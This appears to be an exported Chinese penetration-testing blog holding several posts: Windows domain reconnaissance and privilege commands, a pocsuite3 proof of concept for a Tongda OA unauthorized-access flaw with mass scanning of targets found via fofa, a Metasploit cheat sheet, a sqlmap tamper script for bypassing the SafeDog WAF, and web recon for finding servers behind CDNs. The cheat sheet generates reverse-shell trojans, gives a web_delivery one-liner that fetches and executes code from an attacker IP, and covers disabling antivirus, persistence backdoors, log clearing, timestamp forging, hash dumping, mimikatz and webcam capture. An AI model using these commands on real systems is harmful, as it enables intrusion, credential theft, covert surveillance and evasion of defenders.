自定义防火墙日志存储位置 1netsh advfirewall set currentprofile logging filename &quot;C:\\windows\\temp\\fw.log&quot; 查询远程服务连接查询远程连接端口 在cmd下使用注册表查询语句，命令如下，得到连接端口为0xd3d，转换后为3389 1REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; &#x2F;V PortNumber 在windows server 2003 中开启3389端口 方法一 1wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1 方法二 1REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f 在Windows Server 2008 和 Windows Server 2012 中开启 3389 端口 如下命令来开启3389端口——管理员权限执行否则会报错 1wmic &#x2F;namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1 1wmic &#x2F;namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1 1reg add &quot;HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f 1REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f 自动化信息收集WMIC收集目标机信息的脚本 WMIC脚本的不载地址为http://www.fuzzysecurity.com/scripts/files/wmic_info.rar WMIC（Windows Management Instrumentation Command-Line，Windows管理工具命令行）是Windows下最有用的命令行工具。WMIC对于信息收集和渗透都是非常实用的。默认任何版本的WindowsXP的低权限用户不能访问WMIC，Windows7以上版本允许低权限的用户访问WMIC并执行相关查询操作。 Empire下主机信息收集 在 Empire 下也存在类似模块，输入“usemodule situational_awareness/host/winenum”命令即可查看本机用户、域组成员、最后的密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、 共享信息等 查看当前权限查看当前权限1whoami 获取了一台主机的权限后，会有以下三种情况： 本地普通用户：当前权限为 win-2008 本机的 user 用户： 本地管理员用户：当前权限为 win7-x64-test 本机的 administrator用户： 域内用户：当前权限为 hacke 域内的 administrator用户： 获取域SID1whoami &#x2F;all 判断是否有域执行如下命令，可以查看网关IP 地址、DNS的IP地址、本地地址是否和DNS服务器为同一网段、域名等 1ipconfig &#x2F;all 然后，通过反向解析查询命令nslookup来解析域名的IP地址。使用解析出来的IP地址进行对比，判断域控制器和DNS服务器是否在同一台服务器上 主DNS后缀在ipconfig /all 能查询 1nslookup hacke.testlab 查看系统信息，如结果所示，域即域名，登录服务器为域控制器。如果域显示为 WORKGROUP，表示当前服务器不在域内，当前域名为 hacke.testlab： 1Systeminfo 判断主域1net time &#x2F;domain 或者更详细的信息 1whoami &#x2F;all 探测域内存活主机内网存活主机的探测是内网渗透中不可或缺的一个环节。在扫描的时候，应尽量避免使用Namp等工具进行暴力扫描，也不要在目标机器上使用图形化的工具，而要尽量使用目标系统自带的各种工具，推荐使用PowerShell脚本。对于Windows 7以下版本的系统，可以使用VBS 脚 本。在探测时，可在白天和夜间分别探测，以对比分析存活主机和对应的 IP 地址。###利用NetBIOS快速探测内网NetBIOS是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的统一的命令集，作用是给局域网提供网络及其他特殊功能。几乎所有的局域网都是在NetBIOS协议的基础上工作的。“NetBIOS”也是计算机的标识名，该名字主要用于局域网中计算机之间的相互访问。NetBIOS的工作流程是正常的机器名解析查询应答过程，推荐优先使用。 NetBIOS 的使用比较简单。将其上传到目标主机后，直接输入IP地址范围并运行: 1nbtscan-1.0.35.exe 192.168.174.0&#x2F;24 显示结果的第一列为IP地址，第二列是机器名和所在域名，最后一列是关于机器所开启的服务的列表，具体含义如下表所示: Token 含义 SHARING 该机器中有运行文件和打印共享服务，但不一定有内容共享 DC 该机器可能是域控制 U=USER 该机器有登录名为USER的用户（不是太准确） IIS 该机器可能安装了IIS服务器 EXECHANGE 该机器可能安装了微软的EXCHANGE NOTES 该机器可能安装了 ？ 没有识别出该机器的NETBIOS资源，可以使用“-F”选项再次进行扫描 ICMP 协议快速探测内网 除了利用NetBIOS协议，还可以使用 ICMP 协议。依次对内网中的每个 IP 地址执行 ping 命 令，可以快速有效地找出内网中所有存活的主机。在实战中，可以使用如下命令循环探测整个 C 段 1for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.174.%I | findstr &quot;TTL&#x3D;&quot; 收集域内基础信息在域内添加用户1net user abc Aa123456! &#x2F;add &#x2F;domain 将用户添加到域环境1net group &quot;domain admins&quot; abc &#x2F;add &#x2F;domain 将域用户添加到本地管理员组1net localgroup Administrators &#x2F;add myad.com\\abc 查看域的命令如下1net view &#x2F;domain 查看域内所有计算机 执行如下命令，可以通过查询得到的主机名来对主机角色进行初步判断 例如，”dev”可能是开发服务器,”web”或者app可能是Web服务， “NAS”可能是存储服务器,”fileserver”可能是文件服务器等。 1net view &#x2F;domain:XXX 查看域内所有用户组列表1net group &#x2F;domain Domain Admins：域管理员组。 Domain Computers：域内机器。 Domain Controllers：域控制器。 Domain Guest：域访客组，权限较低。 Domain Users：域用户。 Enterprise Admins：企业系统管理员用户。 查看所有域成员计算机列表1net group &quot;domain computers&quot; &#x2F;domain 获取域信任列表1nltest &#x2F;domain_trusts 查看域控制器1nltest &#x2F;DCLIST:xxx 查看域控制器的ip1Nslookup -type&#x3D;SRV _ldap._tcp 查看域控当前时间1net time &#x2F;domain 查看域控制器组1net group &quot;Domain Controllers&quot; &#x2F;domain 定位域管理员 在通常的网络环境里，内网中部署了大量的网络安全设备，如IDS、IPS、日志审计、安全网关、反病毒软件等。所以，在域网络攻击测试场景中，如果渗透测试人员获取了域内的一个支点，为了实现对域网络的整体控制， 渗透测试人员就需要获取域管理员权限。 常用域管理员定位工具 常用的工具有psloggedon.exe、pveFindADUser.exe、netsess.exe、hunter、NetView 等。在PowerShell中，常用的脚本是PowerView。 psloggedon.exepsloggedon.exe可以显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。如果指定了用户名而不是计算机，psloggedon.exe会搜索网络邻居中的计算机，并显示该用户当前是否已登录，其原理是通过检 验注册表里HKEY_USERS项的key值来查询谁登录过机器（同样调用了NetSessionEnum API）， 某些功能需要拥有管理员权限才能使用。psloggedon.exe的下载地址为https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon，使用如下命令及参数 123psloggedon [-] [-l] [-x] [\\\\computername|username]&#x2F;&#x2F;实例Psloggedon.exe \\\\域名 -：显示支持的选项和用于输出值的单位。 -l：仅显示本地登录，不显示本地和网络资源登录。 -x：不显示登录时间。 \\computername：指定要列出登录信息的计算机的名称。 Username：指定用户名，在网络中搜索该用户登录的计算机。 pveFindADUserpveFindADUser.exe 可用于查找 Active Directory 用户登录的位置，枚举域用户，以及查找在 特定计算机上登录的用户，包括本地用户、通过RDP 登录的用户、用于运行服务和计划任务的用户账 户。运行该工具的计算机需要具有.NET Framework 2.0，并且需要具有管理员权限。pveFindADUser.exe 的下载地址为 https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn，使用如下命令及参数 1pvefindaduser.exe &lt;参数&gt; -h：显示帮助。 -u：检查是否有更新版本的实用程序。 -current [‘’username’’]：如果仅指定了-current 参数，将获取所有目标计算机上当前登录的所 有用户。如果指定了用户名（DOMAIN\\Username），则显示该用户登录的计算机。 -last [‘’username’’]：如果仅指定了-last 参数，将获取目标计算机上的最后一个登录用户。如果指定了用户名（DOMAIN\\Username），则显示具有此用户账户作为上次登录的计算机，根据网络的策略，可能会隐藏最后一个登录用户名，且该工具可能无法得到该用户名。 -noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行 ping 命令。 -target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主 机。如果指定此参数，则后跟一个由逗号分隔的主机名列表。 netviewnetview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登录会话， 利用 NetShareEnum找寻共享，利用 NetWkstaUserEnum枚举登录的用户。同时，netview.exe 能够 查询共享入口和有价值用户。netview.exe 的绝大部分功能不需要管理员权限即可执行，下载地址为https://github.com/mubix/netview，使用如下命令及参数 -h：显示帮助菜单。 -f filename.txt：指定从中提取主机列表的文件。 -e filename.txt：指定要排除的主机名文件。 -o filename.txt：将所有输出重定向到文件。 -d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。 -g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。 -c：检查对已找到共享的访问权限。 利用PowerShell收集域信息PowerShell是微软推出的一款用于提高管理员对操作系统及应用程序易用性和扩展性的脚本环境，可以说是cmd.exe的加强版。微软已经将PowerShell 2.0 内置在Windows Server 2008 和 Windows 7中，将PowerShell 3.0内置在Windows Server 2012和 Windows 8中，将 PowerShell 4.0内置在 Windows Server 2012 R2 和 Windows 8.1 中，将PowerShell 5.0 内置在 Windows Server 2016 和 Windows 10 中。PowerShell 作为微软官方推出的脚本语言，在Windows系统中的强大众所周知：在系统管理员手中，可以提高Windows系统管理工作的自动化程度；在渗透测试人员手中， 便于渗透测试人员更好地绕过系统防护和相关反病毒软件。 如果想在 Windows 系统中执行一个 PowerShell 脚本，首先需要在Windows 系统的“开始菜 单”中打开“Run”对话框，输入“powershell” 接下来，将弹出一个窗口，窗口上方有“Administrator”字样，代表当前 PowerShell 权限为管理员权限 如果想执行一个PowerShell脚本，需要修改PowerShell的默认权限为执行权限。PowerShell常用的执行权限共有四种，具体如下： Restricted：默认设置，不允许执行任何脚本。 Allsigned：只能运行经过证书验证的脚本。 Unrestricted：权限最高，可以执行任意脚本。 RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名在 PowerShell 中输入“Get-ExecutionPolicy”，看到为默认Restricted 1Get-ExecutionPolicy 将 PowerShell 执行权限改为 Unrestricted，输入”Y” 1Set-ExecutionPolicy Unrestricted PowerView是一款依赖PowerShell和WMI对内网域情况进行查询的常用渗透脚本。PowerView集成在PowerSploit工具包中，下载地址为：https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1打开一个PowerShell窗口，进入PowerSploit目录下的 Recon 目录，输入命令“ImportModule .\\PowerView.ps1”，成功导入脚本，没有报错 12&gt; cd .\\Recon&gt; Import-Module .\\PowerView.ps1 PowerView中的常用命令如下： Get-NetDomain：获取当前用户所在的域名称。 Get-NetUser：返回所有用户的详细信息。 Get-NetDomainController：获取所有域控制器。 Get-NetComputer：获取所有域内机器的详细信息。 Get-NetOU：获取域中的 OU 信息。 Get-NetGroup：获取所有域内组和组成员信息。 Get-NetFileServer：根据 SPN 获取当前域使用的文件服务器。 Get-NetShare：获取当前域内所有网络共享。 Get-NetSession：获取在指定服务器存在的会话信息。 Get-NetRDPSession：获取在指定服务器存在的远程连接信息。 Get-NetProcess：获取远程主机的进程信息。 Get-UserEvent：获取指定用户的日志信息。 Get-ADObject：获取活动目录的对象信息。 Get-NetGPO：获取域所有组策略对象。 Get-DomainPolicy：获取域默认或域控制器策略。 Invoke-UserHunter：用于获取域用户登录计算机及该用户是否有本地管理权限。 Invoke-ProcessHunter：查找域内所有机器进程用于找到某特定用户。 Invoke-UserEventHunter：根据用户日志获取某域用户登录过哪些域机器。 参考链接： https://mp.weixin.qq.com/s/4UELXeyAVjvKur-lw1tEJA","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"通达OA未授权访问漏洞","slug":"web/通达oa未授权访问漏洞","date":"2021-03-10T14:18:03.153Z","updated":"2021-04-08T06:43:36.807Z","comments":true,"path":"2021/03/10/web/通达oa未授权访问漏洞/","link":"","permalink":"http://example.com/2021/03/10/web/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"漏洞类型：未授权访问漏洞利用条件：用户在线漏洞详情1、先访问 http://xxx.xxx.xxx/mobile/auth_mobi.php?isAvatar=1&amp;uid=1&amp;P_VER=0 如果出现空白页面,则说明已经获得权限. 2、在访问http://xxx.xxx.xxx/general/ ,成功进入系统 3、如果出现RELOGIN,则说明目前没有人在线,需要等待有人登录的时候在尝试 pocsuite3编写pocgithub下载地址：https://github.com/knownsec/Pocsuite3使用pocsuite3编写poc,代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243import refrom pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPEclass DemoPOC(POCBase): vulID &#x3D; &#39;&#39; # ssvid version &#x3D; &#39;1.0&#39; author &#x3D; [&#39;w7ay&#39;] vulDate &#x3D; &#39;2021-3-8&#39; createDate &#x3D; &#39;2021-3-8&#39; updateDate &#x3D; &#39;2021-3-8&#39; references &#x3D; [&#39;https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;IabOKaeNyAsh8V4k2cmXAw&#39;] name &#x3D; &#39;通达OA未授权访问漏洞&#39; appPowerLink &#x3D; &#39;&#39; appName &#x3D; &#39;Confluence&#39; appVersion &#x3D; &#39;&#39; vulType &#x3D; VUL_TYPE.CODE_EXECUTION desc &#x3D; &#39;&#39;&#39;查看是否存在通达OA未授权访问漏洞&#39;&#39;&#39; samples &#x3D; [] install_requires &#x3D; [&#39;&#39;] category &#x3D; POC_CATEGORY.EXPLOITS.WEBAPP def _verify(self): result &#x3D; &#123;&#125; payload &#x3D; &quot;&#x2F;mobile&#x2F;auth_mobi.php?isAvatar&#x3D;1&amp;uid&#x3D;1&amp;P_VER&#x3D;0&quot; response &#x3D; requests.get(self.url + payload) if &quot;RELOGIN&quot; not in response.text and response.status_code &#x3D;&#x3D; 200: result[&#39;status&#39;] &#x3D; &#39;[+] 存在通达OA未授权访问漏洞&#39; return self.parse_output(result) def _attack(self): return self._verify() def parse_output(self, result): output &#x3D; Output(self) if result: output.success(result) else: output.fail(&#39;target is not vulnerable&#39;) return outputregister_poc(DemoPOC) 主要在于使用_verify()这个函数验证是否存在漏洞，判断如果返回的内容不存在RELOGIN，并且状态码为200，说明可能存在漏洞。 将写好的脚本保存放在pocs目录下，文件名为oa.py。 利用fofa收集ip，搜索语法：body=”通达oa” 将收集的ip保存放在pocsuite3目录下，文件名为通达OA.txt 在pocsuite3目录下运行脚本：python3 cli.py -r pocs/oa.py -f 通达OA.txt –plugins html_report -r 表示指定使用的脚本文件 -f 表示目标文件 –plugins html_report 表示将结果保存为html文件 结果输出保存在HTML文件中，打开文件 验证结果如下： 参考链接：https://mp.weixin.qq.com/s/IabOKaeNyAsh8V4k2cmXAw","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"通用漏洞","slug":"通用漏洞","permalink":"http://example.com/tags/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/"}]},{"title":"msf使用大全","slug":"Metasploit","date":"2021-01-18T16:00:00.000Z","updated":"2021-03-09T11:04:18.945Z","comments":true,"path":"2021/01/19/Metasploit/","link":"","permalink":"http://example.com/2021/01/19/Metasploit/","excerpt":"","text":"五大模块12345Auxiliaries &#x2F;&#x2F;辅助模块Exploit &#x2F;&#x2F;漏洞利用模块Playload &#x2F;&#x2F;攻击载荷模块Post &#x2F;&#x2F;后期渗透模块Encoders &#x2F;&#x2F;编码模块 基本命令12345678910111213?&#x2F;help &#x2F;&#x2F;查看帮助信息? 命令名 &#x2F;&#x2F;查看命令如何使用search &#x2F;&#x2F;查找use &#x2F;&#x2F;使用某一工具back &#x2F;&#x2F;返回info 模块名 &#x2F;&#x2F;显示模块信息show options &#x2F;&#x2F;显示所有选项set &#x2F;&#x2F;给一个选项赋值到全局变量unset &#x2F;&#x2F;取消选项的赋值unsetg &#x2F;&#x2F;取消一个选项赋值到全局变量version &#x2F;&#x2F;显示MSF和控制台版本show payloads &#x2F;&#x2F;显示所有payloadjobs &#x2F;&#x2F;查看代理 模块的使用升级模块命令 如果搜索不到最新的Exploit，可以输入以下命令进行升级，获取最新的模块 1msfupdate 扫描模块常见扫描模块 模块 功能 auxiliary/scanner/portscan 端口扫描 auxiliary/scanner/smb/smb_version SMB系统版本扫描 auxiliary/scanner/smb/smb_enumusers SMB枚举 auxiliary/scanner/smb/smb_login SMB弱口令扫描 auxiliary/scanner/smb/psexec_command SMB登录且执行命令 auxiliary/scanner/ssh/ssh_login SSH登录测试 scanner/mssql_ping MSSQL主机信息扫描 admin/scanner/mssql_enum MSSQL枚举 admin/scanner/mssql_exec MSSQL执行命令 admin/scanner/mssql_sql MSSQL查询 scanner/scanner/mssql_login MSSQL弱口令扫描 auxiliary/admin/mysql/mysql_enum MySQL枚举 auxiliary/admin/mysql/mysql_sql MySQL语句执行 auxiliary/scanner/mysql/mysql_login MySQL弱口令扫描 auxiliary/scanner/smtp/smtp_version SMTP版本扫描 auxiliary/scanner/smtp/smtp_enum SMTP枚举 auxiliary/scanner/snmp/community SNMP扫描设备 auxiliary/scanner/telnet/telnet_login TELNET登录 scanner/vnc/vnc_none_auth VNC空口令扫描 系统信息模块1use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version 端口扫描模块12search portscanuse auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp 探测存活主机1use windows&#x2F;gather&#x2F;arp_scanner 还可以在反弹回来的shell中使用 1meterpreter&gt; run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;192.168.80.127&#x2F;24 arp探测存活主机 如果目标机开启了防火墙，就需要用arp来探测 1meterpreter&gt; run arp_scanner -r 192.168.11.31&#x2F;24 攻击模块MS17-010 永恒之蓝 攻击端口号：445 补丁编号：401开头，如果没打补丁，但防火墙限制了445端口访问，也不能成功攻击 1234search MS17-010 &#x2F;&#x2F;搜索17-010模块use 1 &#x2F;&#x2F;通常使用0编号模块或者1set rhost [目标机ip] run &#x2F;&#x2F;其他项默认设置，如果开启了代理ip，lhost要设置代理ip 成功会返回一个shell，如果不成功需要多打几次 web_delivery12345search web_delivery &#x2F;&#x2F;首先搜索模块use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery &#x2F;&#x2F;选择模块set lhost [这里是你自己的ip] &#x2F;&#x2F;设置攻击机ipshow targets &#x2F;&#x2F;选择攻击的脚本，默认为pythonrun &#x2F;&#x2F;运行后会生成一段payload代码 payload: python -c “import sys; u=import(‘urllib’+{2:’’,3:’.request’}[sys.version_info[0]],fromlist=(‘urlopen’,));r=u.urlopen(‘http://192.168.0.102:8080/UrY3oE&#39;);exec(r.read());&quot; 上面代码为选择python运行后生成的代码 复制payload到目标机上面运行 返回kai liunx攻击机，已经反弹回了一个session 输入sessions [返回的编号]进入，成功获取了目标机 监听模块msfvenom参数12345lhost &#x2F;&#x2F;监听的ip地址，通常选择本机iplport &#x2F;&#x2F;监听的端口号-p &#x2F;&#x2F;选择最后生成的木马类型-o &#x2F;&#x2F;指定路径-f &#x2F;&#x2F;指定后缀名 msfvenom生成木马方式1msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lport&#x3D;7777 lhost&#x3D;192.168.80.127 -f exe -o &#x2F;root&#x2F;muma.exe windows木马 1msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp lport&#x3D;7777 lhost&#x3D;192.168.80.127 -f elf -o &#x2F;root&#x2F;muma.elf linux木马 1msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lport&#x3D;7777 lhost&#x3D;192.168.80.127 -f raw -o &#x2F;root&#x2F;muma.php php木马页面，将页面放在php服务器上既可反弹shell 1msfvenom -p java&#x2F;meterpreter&#x2F;reverse_tcp LPORT&#x3D;777 LHOST&#x3D;192.168.80.127 -f war -o muma.war jsp木马页面，用在tomcat中间件漏洞上 设置监听12345use multi&#x2F;handler &#x2F;&#x2F;使用监听模块set lhost [本机ip] &#x2F;&#x2F;生成木马指定的ipset lport [端口] &#x2F;&#x2F;生成木马指定的端口set payload [攻击脚本] &#x2F;&#x2F;生成木马指定的脚本run 设置好监听run运行，将生成的木马放在目标机上运行，就能反弹回shell到指定的监听ip，通常监听的ip写本机ip msf的一个特性 运行木马反弹shell的时候，目标机会自动多出一个notepad.ext（记事本）的进程 提权模块UAC模块12search uacuse exploit&#x2F;windows&#x2F;local&#x2F;bypassuac ms16_032 搜索模块 1234search ms16032 &#x2F;&#x2F;选择对应模块use windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privescset session 1 &#x2F;&#x2F;设置session，其他默认，进行攻击run &#x2F;&#x2F;成功的话会返回一个新的meterpreter 14-0581search 14-058 代理模块添加代理的原因：假设本机在ip为192.168.80网段下，目标机A有两个网卡，一个为192.168.80（本机能够访问的网段），另一个网段为192.168.6，目标机B也在192.168.6下，本机访问不到目标机b,添加完代理后，目标机就能通过目标机A的路由添加，使用代理访问到目标机B 使用代理模块的前提需要使用路由添加 12search socks &#x2F;&#x2F;有scoks4或socks5等代理方式use auxiliary&#x2F;server&#x2F;socks4a 参数12srvhost &#x2F;&#x2F;设为本机ipsrvport &#x2F;&#x2F;默认1080 proxychains msf添加完代理后配合kali的proxychains代理工具 12vim &#x2F;etc&#x2F;proxychains.conf &#x2F;&#x2F;查看代理配置socks4 [本机ip] 1080 &#x2F;&#x2F;修改配置，保存 使用方式：只需要在需要使用的工具前使用proxychains 1proxychains nmap -sT -Pn -p 80,445 192.168.80.127 Meterpreter命令获取正在运行的进程1ps 查看Meterpreter shell的进程号1getpid 进程迁移1migrate [要迁移的进程号] 自动迁移进程1run post&#x2F;windows&#x2F;manage&#x2F;migrate 查看系统信息1sysinfo 查看是否为虚拟机1run post&#x2F;windows&#x2F;gather&#x2F;checkvm 查看运行时间1idletime 查看完整的网络设置1route 查看权限1getuid 关闭杀毒软件1run post&#x2F;windows&#x2F;manage&#x2F;killav 启动远程桌面1run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp 查看网络结构1run post&#x2F;windows&#x2F;manage&#x2F;autoroute 列举当前多少用户登录了目标机1run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users 列举应用程序1run post&#x2F;windows&#x2F;gather&#x2F;enum_applications 抓取自动登录的用户名和密码1run windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin 抓取屏幕截图 需要先加载扩展插件expia，然后再执行 12load espiascreengrab 查看目标有没有摄像头1webcam_list 抓取摄像头的图片1webcam_snap 开启直播模式1webcam_stream 用浏览器打开上面的地址 进入目标机shell1shell 文件系统命令查看当前处于哪个目录12pwd &#x2F;&#x2F;下面的命令同样效果getwd 查看当前处于本地的哪个目录1getlwd 切换目录1cd c:&#x2F; 搜索文件 搜索C盘所有以.txt扩展名文件 1search -f *.txt -d c:&#x2F; 下载文件 下载目标机C盘的test.txt文件到攻击机root下 如果指定的是一个文件夹，会把文件夹内的所有文件下载下来，不包括那个文件夹 1download c:&#x2F;test.txt &#x2F;root 上传文件 上传本地root文件到目标机的C盘下 如果指定的是一个文件夹，会把文件夹内的所有文件上传上去，不包括那个文件夹 1upload &#x2F;root&#x2F;test.txt c:&#x2F; 执行文件 创建新进程cmd.exe，-H不可见，-i交互 1execute -H -i -f cmd.exe 伪造时间戳 查看帮助 1timestomp C:&#x2F;&#x2F; -h 查看时间戳 1timestomp -v C:&#x2F;&#x2F;2.txt 将1.txt的时间戳复制给2.txt 1timestomp C:&#x2F;&#x2F;2.txt -f C:&#x2F;&#x2F;1.txt 清除日志 winodws查看事件日志：右键“我的电脑”，选择管理，打开「事件查看器」；或者同时按下 Windows键 + R键，输入“eventvwr.msc”直接打开「事件查看器」。 1clearev 添加路由 查看路由信息 1run autoroute -p 手动添加路由 1run autoroute -s ip&#x2F;24 自动添加路由 1run post&#x2F;multi&#x2F;manage&#x2F;autoroute 端口转发 将目标机的端口3389转发到本地端口6666 1portfwd add -l 6666 -p 3389 -r 192.168.80.135 留后门1run persistence -A -S -U -i 5 -p 8899 -r 192.168.80.127 权限提升进入目标机的cmd1shell 编号设置为UTF1chcp 65001 查看当前权限1whoami&#x2F;groups 标准用户：Mandatory Label\\Medium Mandatory Level Label 管理员：Mandatory Label\\High Mandatory Level Label 查看系统的已打补丁 Hotfix(s):为修补程序 1systeminfo 或者查询C:\\windows\\里留下的补丁号”.log” Wmic查看系统补丁12Wmic qfe get Caption,Description,HotFixID,InstalledOn meterpreter提权1meterpreter&gt; getsystem 令牌窃取使用token 1use incognito 列出可用的token 令牌类型 Delegation Tokens 授权令牌 Impersonation 模拟令牌 1list_tokens -u 如果获取的列表里面有管理员令牌，调用impersonate_token命令假冒Administrator用户进行攻击 1impersonate_token WIN-57TJ4B561MT\\\\Administrator 获取哈希值1hashdump 在非system权限下运行hashdump命令会失败，而且在windows 7、windows Server 2008下有时候会出现进程移植不成功等问题；而另一个模块smart_hashdump的功能更强大，可以导出所有域用户的hash 1run windows&#x2F;gather&#x2F;smart_hashdump mimikatz加载mimikatz模块 1load mimikatz 查看帮助 1help mimikatz 抓取hash 1msv 查看全部功能 1mimikatz_command -f a:: 抓取hash 1mimikatz_command -f samdump::hashes —— 参考来源《Web安全攻防》","categories":[{"name":"工具使用","slug":"工具使用","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"内网","slug":"内网","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91/"}]},{"title":"tamper 安全狗的绕过","slug":"tamper安全狗绕过","date":"2021-01-04T16:00:00.000Z","updated":"2021-03-09T09:40:27.078Z","comments":true,"path":"2021/01/05/tamper安全狗绕过/","link":"","permalink":"http://example.com/2021/01/05/tamper%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87/","excerpt":"","text":"使用sqlmap编写绕过安全狗的tamper，代码如下。 将写好的文件放在sqlmap的tamper下，如果是新创建文件夹，需要复制__init__.py放在新建的文件夹中。 12345678910111213141516171819202122&quot;&quot;&quot;安全狗绕过&quot;&quot;&quot;import refrom lib.core.enums import PRIORITY__priority__ &#x3D; PRIORITY.NORMALdef dependencies(): passdef tamper(payload, **kwargs):retVal &#x3D; payloadif payload: # 将payload参数中的所有空格替换进行绕过 retVal &#x3D; retVal.replace(&#39; &#39;, &#39;&#x2F;*!99999sadadad*&#x2F;%23%0a&#39;)return retVal 使用命令：python sqlmap.py -u http://漏洞站点/?id=1 –batch –purge –technique=U –tamper “tamper脚本.py” –dbs 其中–tamper指定写好的脚本路径，–technique指定注入方式，U表示联合注入","categories":[{"name":"python","slug":"python","permalink":"http://example.com/categories/python/"}],"tags":[{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"web 信息收集","slug":"web信息收集","date":"2021-01-02T16:00:00.000Z","updated":"2021-03-09T09:42:50.183Z","comments":true,"path":"2021/01/03/web信息收集/","link":"","permalink":"http://example.com/2021/01/03/web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"主动和被动 主动信息收集：通过直接访问、扫描网站，这种流量将流经网站 被动信息收集：利用第三方的服务对目标进行访问了解，比例：Google搜索、Shodan搜索等 域名信息收集当我们确定了要渗透的目标，也就是知道了其域名，接下来我们需要收集域名对应的 ip，域名的whois信息、子域名等等一系列与域名相关的信息。 判断域名对应的ip 判断该域名是否存在CDN，可以去在线CDN查询网站，如果查询的ip数量大于一个的，说明不是真实的服务器地址 如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。 在线CDN查询网站 http://ping.chinaz.com/ 判断是否有CDN 使用不同地方的ping服务，查看对应ip地址是否唯一，如果不唯一则极可能是使用了CND ping测试网站 https://wepcc.com/http://ping.chinaz.com/http://ping.aizhan.com/ (1)查询子域名：毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。传送门——&gt; 子域名信息查询 (2)查询主域名：以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不适用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了，您别说，这个方法还真是屡用不爽。 (3)邮件服务器：一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。 (4)查看域名历史解析记录：也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站https://www.netcraft.com 来观察域名的IP历史记录。 (5)查看域名历史解析记录：国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站https://asm.ca.com/en/ping.php 访问 